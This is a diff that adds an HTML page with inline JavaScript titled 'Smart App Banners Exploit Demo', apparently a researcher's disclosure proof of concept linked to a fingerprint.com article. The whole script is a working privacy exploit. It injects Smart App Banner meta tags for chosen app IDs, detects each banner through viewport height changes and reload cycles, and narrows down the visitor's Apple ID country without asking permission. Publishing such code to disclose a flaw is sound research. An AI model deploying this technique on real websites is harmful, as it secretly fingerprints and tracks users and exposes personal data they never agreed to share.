@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>appleid-region-detector</title>
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,user-scalable=no"
+    />
+    <style>
+      html,
+      body,
+      #root {
+        padding: 0;
+        margin: 0;
+        background-color: #141415;
+        color: #fafafa;
+        height: 100%;
+        font-family: system-ui, -apple-system;
+        line-height: 150%;
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 30px;
+        box-sizing: border-box;
+        padding-bottom: 100px;
+        touch-action: none;
+      }
+
+      h1,
+      h2,
+      h3 {
+        color: #ff5d22;
+        text-align: center;
+        line-height: 150%;
+      }
+
+      p {
+        text-align: center;
+      }
+
+      button {
+        appearance: none;
+        width: 156px;
+        height: 56px;
+        color: #ffffff;
+        background-color: #ff5d22;
+        border-radius: 6px;
+        border: none;
+        font-weight: 500;
+        font-size: 16px;
+        line-height: 150%;
+        font-family: system-ui, -apple-system;
+        padding: 16px;
+        margin-top: 30px;
+      }
+
+      img {
+        width: 150px;
+        max-width: 70vw;
+        max-height: 16vh;
+        height: 130px;
+        margin-bottom: 24px;
+      }
+
+      footer {
+        position: absolute;
+        bottom: 0;
+        width: 100%;
+        display: flex;
+        height: 100px;
+        justify-content: center;
+        align-items: center;
+      }
+
+      a {
+        display: inline-block;
+        margin: 0px 20px;
+        color: #434344;
+        text-decoration: none;
+        border-bottom: 1px solid #434344;
+        padding: 2px 0px;
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      let countriesPromise, appsPromise;
+      let bannerWasShown = false;
+      let isBannerDisplayed = false;
+
+      const LOCAL_STORAGE_KEY = "state";
+      const state = getState();
+
+      renderApp();
+      runDetectionStep();
+
+      if (!state.isStarted) {
+        countriesPromise = fetchCountries();
+        appsPromise = fetchApps();
+      }
+
+      function runDetectionStep() {
+        const FACEBOOK_APP_ID = 284882215;
+        const BROWSER_VALIDATION_TIMEOUT = 1000;
+        const BANNER_REFRESH_TIMEOUT = 300;
+        const BANNER_SHOWN_TIMEOUT = 3000;
+
+        // Refresh screen height after successful banner
+        if (window.visualViewport.height < state.screenHeight) {
+          setTimeout(() => {
+            document.location.reload();
+          }, BANNER_REFRESH_TIMEOUT);
+
+          // Validate browser
+        } else if (state.isValidatingBrowser) {
+          listenVisualViewportResize();
+          renderSmartAppBanner(FACEBOOK_APP_ID);
+
+          // Banner was never shown, wrong browser mode
+          setTimeout(() => {
+            if (!bannerWasShown) {
+              setStateAndReload({
+                isValidatingBrowser: false,
+                isBrowserSupported: false,
+              });
+            }
+          }, BROWSER_VALIDATION_TIMEOUT);
+
+          // Search country
+        } else if (
+          state.isBrowserSupported &&
+          state.isDetecting &&
+          state.nextAppId
+        ) {
+          listenVisualViewportResize();
+          renderSmartAppBanner(state.nextAppId);
+
+          // Banner was never shown, skip the app Id
+          setTimeout(() => {
+            if (!bannerWasShown) {
+              const excludeApps = [...state.excludeApps, state.nextAppId];
+              const nextAppId = findAppCandidate(
+                state.searchScope,
+                excludeApps
+              );
+
+              setStateAndReload({
+                isDetecting: !!nextAppId,
+                isFinished: !nextAppId,
+                excludeApps,
+                nextAppId,
+              });
+            }
+          }, BROWSER_VALIDATION_TIMEOUT);
+
+          // Banner is loaded
+          setTimeout(() => {
+            if (isBannerDisplayed) {
+              setStepResultAndReload(true);
+            }
+          }, BANNER_SHOWN_TIMEOUT);
+        }
+      }
+
+      // Events
+      function handleDetectionStart() {
+        Promise.all([countriesPromise, appsPromise]).then(
+          ([countryMap, appMap]) => {
+            setStateAndReload({
+              isStarted: true,
+              isValidatingBrowser: true,
+              screenHeight: window.visualViewport.height,
+              excludeApps: [],
+              appMap,
+              countryMap,
+              searchScope: Object.keys(countryMap),
+            });
+          }
+        );
+      }
+
+      function handleReset(event) {
+        event.preventDefault();
+        localStorage.removeItem(LOCAL_STORAGE_KEY);
+        document.location.reload();
+      }
+
+      function listenVisualViewportResize() {
+        window.visualViewport.addEventListener(
+          "resize",
+          handleVisualViewportResize
+        );
+      }
+
+      function cancelVisualViewportResizeListening() {
+        window.visualViewport.removeEventListener(
+          "resize",
+          handleVisualViewportResize
+        );
+      }
+
+      function handleVisualViewportResize() {
+        const nextHeight = window.visualViewport.height;
+
+        isBannerDisplayed = nextHeight < state.screenHeight;
+        bannerWasShown ||= isBannerDisplayed;
+
+        if (state.isValidatingBrowser && bannerWasShown) {
+          setStateAndReload(
+            {
+              isValidatingBrowser: false,
+              isBrowserSupported: true,
+              isDetecting: true,
+              nextAppId: findAppCandidate(state.searchScope),
+              screenHeightWithBanner: nextHeight,
+            },
+            300
+          );
+        }
+
+        if (state.isDetecting && bannerWasShown && !isBannerDisplayed) {
+          setStepResultAndReload(false, 200);
+        }
+      }
+
+      // State management
+      function getState() {
+        return JSON.parse(localStorage.getItem(LOCAL_STORAGE_KEY) || "{}");
+      }
+
+      function setStateAndReload(nextState, reloadTimeout = 0) {
+        localStorage.setItem(
+          LOCAL_STORAGE_KEY,
+          JSON.stringify({
+            ...getState(),
+            ...nextState,
+          })
+        );
+
+        setTimeout(() => {
+          document.location.reload();
+        }, reloadTimeout);
+      }
+
+      function setStepResultAndReload(isSuccessful, reloadTimeout) {
+        const appId = state.nextAppId;
+        const excludeApps = [...state.excludeApps, appId];
+        const appScope = state.appMap[appId].countries;
+
+        const searchScope = isSuccessful
+          ? appScope.filter((it) => state.searchScope.includes(it))
+          : state.searchScope.filter((it) => !appScope.includes(it));
+
+        const nextAppId = findAppCandidate(searchScope, excludeApps);
+        const isFinished = !nextAppId || searchScope.length === 1;
+
+        setStateAndReload(
+          {
+            isDetecting: !!nextAppId && !isFinished,
+            isFinished,
+            excludeApps,
+            searchScope,
+            nextAppId,
+          },
+          reloadTimeout
+        );
+      }
+
+      // Utils
+      function fetchApps() {
+        return fetch("./data/applications.json").then((res) => res.json());
+      }
+
+      function fetchCountries() {
+        return fetch("./data/apple-regions.json").then((res) => res.json());
+      }
+
+      function findAppCandidate(searchScope, excludeApps = []) {
+        const appByScore = scoreAppByCountries(searchScope);
+        const target = Math.ceil(searchScope.length / 2);
+
+        let maxScore = Infinity;
+        let maxAppId = 0;
+
+        appByScore.forEach((value, appId) => {
+          const score = Math.abs(target - value);
+          if (!excludeApps.includes(appId) && score < maxScore) {
+            maxScore = score;
+            maxAppId = appId;
+          }
+        });
+
+        return maxScore < target ? maxAppId : undefined;
+      }
+
+      function scoreAppByCountries(scope) {
+        const appIds = Object.keys(state.appMap);
+        const appByScore = new Map();
+
+        for (const appId of appIds) {
+          const appRegions = state.appMap[appId].countries;
+          let score = 0;
+
+          for (const country of appRegions) {
+            if (scope.includes(country)) {
+              score++;
+            }
+          }
+
+          appByScore.set(appId, score);
+        }
+
+        return appByScore;
+      }
+
+      function shuffleArray(array) {
+        let currentIndex = array.length,
+          randomIndex;
+
+        while (currentIndex != 0) {
+          randomIndex = Math.floor(Math.random() * currentIndex);
+          currentIndex--;
+
+          [array[currentIndex], array[randomIndex]] = [
+            array[randomIndex],
+            array[currentIndex],
+          ];
+        }
+
+        return array;
+      }
+
+      // UI
+      function renderApp() {
+        const isMobileSafari =
+          "ApplePayError" in window &&
+          "ongestureend" in window &&
+          !("safari" in window);
+
+        if (!isMobileSafari) {
+          renderUnsupportedDevice();
+        } else if (!state.isStarted) {
+          renderWelcomeScreen();
+        } else if (!state.isValidatingBrowser && !state.isBrowserSupported) {
+          renderUnsupportedBrowserMode();
+        } else if (state.isFinished) {
+          renderFinalResult();
+        } else {
+          renderInProgress();
+        }
+      }
+
+      function renderWelcomeScreen() {
+        const image = document.createElement("img");
+        image.src = "./assets/hero-image.svg";
+        document.body.appendChild(image);
+
+        const title = document.createElement("h1");
+        title.textContent = "Smart App Banners Exploit Demo";
+        document.body.appendChild(title);
+
+        const paragraph = document.createElement("p");
+        paragraph.textContent =
+          "The exploit leverages the Smart App Banners features to reveal a user's Apple ID region without permissions.";
+        document.body.appendChild(paragraph);
+
+        const button = document.createElement("button");
+        button.textContent = "Start";
+        button.onclick = handleDetectionStart;
+        document.body.appendChild(button);
+
+        renderFooter();
+      }
+
+      function renderUnsupportedDevice() {
+        const image = document.createElement("img");
+        image.src = "./assets/unsupported-image.svg";
+        document.body.appendChild(image);
+
+        const title = document.createElement("h1");
+        title.textContent = "Unsupported Device";
+        document.body.appendChild(title);
+
+        const paragraph = document.createElement("p");
+        paragraph.textContent =
+          "Please run this demo in mobile Safari browser on iPhone or iPad.";
+        document.body.appendChild(paragraph);
+
+        renderFooter();
+      }
+
+      function renderUnsupportedBrowserMode() {
+        const title = document.createElement("h1");
+        title.textContent = "Open in Safari App Without Private Mode";
+        document.body.appendChild(title);
+
+        const paragraph = document.createElement("p");
+        paragraph.textContent =
+          "The demo works only in non-private Safari tabs and may not work inside application's Webview";
+        document.body.appendChild(paragraph);
+
+        renderFooterInProgress();
+      }
+
+      function renderFooter() {
+        const footer = document.createElement("footer");
+
+        const articleLink = document.createElement("a");
+        articleLink.href = "https://fingerprint.com/blog/apple-id-region-leak";
+        articleLink.textContent = "Article";
+        footer.appendChild(articleLink);
+
+        const sourceCodeLink = document.createElement("a");
+        sourceCodeLink.href =
+          "https://github.com/fingerprintjs/blog-apple-id-region-detection";
+        sourceCodeLink.textContent = "Source Code";
+        footer.appendChild(sourceCodeLink);
+
+        document.body.appendChild(footer);
+      }
+
+      function renderFooterInProgress() {
+        const footer = document.createElement("footer");
+
+        const resetLink = document.createElement("a");
+        resetLink.href = "#";
+        resetLink.textContent = "Reset and try again";
+        resetLink.onclick = handleReset;
+        footer.appendChild(resetLink);
+
+        document.body.appendChild(footer);
+      }
+
+      function renderInProgress() {
+        const title = document.createElement("h4");
+        title.textContent = "Detecting, please wait";
+        document.body.appendChild(title);
+
+        const shuffledScope = state.searchScope.slice();
+        shuffleArray(shuffledScope);
+
+        const displayedCountries = shuffledScope
+          .slice(0, 10)
+          .map((countryCode) => state.countryMap[countryCode]);
+
+        const restCountriesLength =
+          state.searchScope.length - displayedCountries.length;
+
+        const paragraph = document.createElement("p");
+        paragraph.innerHTML = displayedCountries.join(", ");
+
+        if (restCountriesLength > 0) {
+          paragraph.innerHTML += `<br/><br/> <strong> and ${restCountriesLength} countries more <strong>`;
+        }
+
+        document.body.appendChild(paragraph);
+
+        renderFooterInProgress();
+      }
+
+      function renderFinalResult() {
+        const displayedCountries = state.searchScope.map(
+          (countryCode) => state.countryMap[countryCode]
+        );
+
+        const title = document.createElement("h3");
+
+        if (displayedCountries.length === 1) {
+          title.textContent = "Your Apple ID country:";
+        } else {
+          title.textContent = "Possible countries detected:";
+          // document.body.style["touch-action"] = "auto";
+        }
+
+        document.body.appendChild(title);
+
+        const paragraph = document.createElement("p");
+        paragraph.innerHTML = displayedCountries.join(" <br/> ");
+
+        document.body.appendChild(paragraph);
+
+        renderFooterInProgress();
+      }
+
+      function renderSmartAppBanner(appId) {
+        const meta = document.createElement("meta");
+
+        meta.name = "apple-itunes-app";
+        meta.content = "app-id=" + appId;
+
+        document.head.appendChild(meta);
+      }
+    </script>
+  </body>
+</html>
